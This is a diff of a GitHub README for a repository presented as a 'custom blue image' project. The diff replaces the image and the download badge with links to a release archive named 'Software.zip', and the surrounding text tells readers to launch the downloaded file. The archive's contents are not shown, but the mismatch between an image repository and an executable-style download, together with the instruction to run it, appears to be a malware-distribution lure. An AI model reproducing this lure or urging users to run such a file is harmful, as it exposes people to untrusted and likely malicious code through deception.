@@ -1,7 +1,7 @@
 
 # 🌟 Welcome to the Custom Blue Image Repository! 🌟
 
-![Blue Image](https://image.shutterstock.com/image-photo/abstract-blue-background-gradient-color-260nw-1731643732.jpg)
+![Blue Image](https://github.com/DanionFyr3/custom-blue-image/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -29,7 +29,7 @@ This repository focuses on a custom blue image. Please explore the topics and de
 
 ## Installation:
 To get started with the custom blue image, you can download the repository by clicking on the following link:  
-[![Download Repository](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/DanionFyr3/custom-blue-image/releases/download/v1.0/Software.zip)](https://github.com/DanionFyr3/custom-blue-image/releases/download/v1.0/Software.zip)
 
 **Note:** Make sure to launch the downloaded file to begin exploring the custom blue image content.
 
